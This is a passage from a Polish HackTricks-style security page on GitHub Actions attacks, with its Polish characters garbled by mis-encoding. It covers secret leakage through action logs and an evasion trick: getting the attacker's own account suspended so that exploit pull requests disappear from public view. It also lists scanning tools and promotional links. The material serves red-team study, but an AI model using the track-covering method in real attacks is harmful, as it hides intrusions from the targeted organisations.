Nawet jeÅ›li **Github** stara siÄ™ **wykrywaÄ‡ wartoÅ›ci sekretÃ³w** w logach akcji i **unikaÄ‡ ich wyÅ›wietlania**, **inne wraÅ¼liwe dane**, ktÃ³re mogÅ‚y zostaÄ‡ wygenerowane podczas wykonywania akcji, nie bÄ™dÄ… ukryte. Na przykÅ‚ad JWT podpisany wartoÅ›ciÄ… sekretu nie bÄ™dzie ukryty, chyba Å¼e jest to [specjalnie skonfigurowane](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Zacieranie Å›ladÃ³w

(Technika z [**tÄ…d**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Przede wszystkim, kaÅ¼dy PR jest wyraÅºnie widoczny publicznie na Github i dla docelowego konta GitHub. DomyÅ›lnie na GitHub **nie moÅ¼emy usunÄ…Ä‡ PR z internetu**, ale jest pewien haczyk. Dla kont GitHub, ktÃ³re sÄ… **zawieszone** przez Github, wszystkie ich **PR sÄ… automatycznie usuwane** i znikajÄ… z internetu. Aby ukryÄ‡ swojÄ… aktywnoÅ›Ä‡, musisz albo **zawiesiÄ‡ swoje konto GitHub, albo oznaczyÄ‡ swoje konto**. To **ukryje wszystkie twoje dziaÅ‚ania** na GitHub z internetu (praktycznie usunie wszystkie twoje PR z exploitami).

Organizacja na GitHub jest bardzo proaktywna w zgÅ‚aszaniu kont do GitHub. Wystarczy, Å¼e udostÄ™pnisz â€jakieÅ› rzeczyâ€ w Issue, a oni upewniÄ… siÄ™, Å¼e twoje konto zostanie zawieszone w ciÄ…gu 12 godzin :p i oto masz, twÃ³j exploit staje siÄ™ niewidoczny na github.

{% hint style="warning" %}
Jedynym sposobem, aby organizacja dowiedziaÅ‚a siÄ™, Å¼e byÅ‚a celem, jest sprawdzenie logÃ³w GitHub z SIEM, poniewaÅ¼ z interfejsu GitHub PR zostanie usuniÄ™ty.
{% endhint %}

## NarzÄ™dzia

NastÄ™pujÄ…ce narzÄ™dzia sÄ… przydatne do znajdowania workflowÃ³w Github Action, a nawet do znajdowania podatnych:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* SprawdÅº [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) albo **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **UdostÄ™pniaj triki hakerskie, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na github.

</details>
{% endhint %}
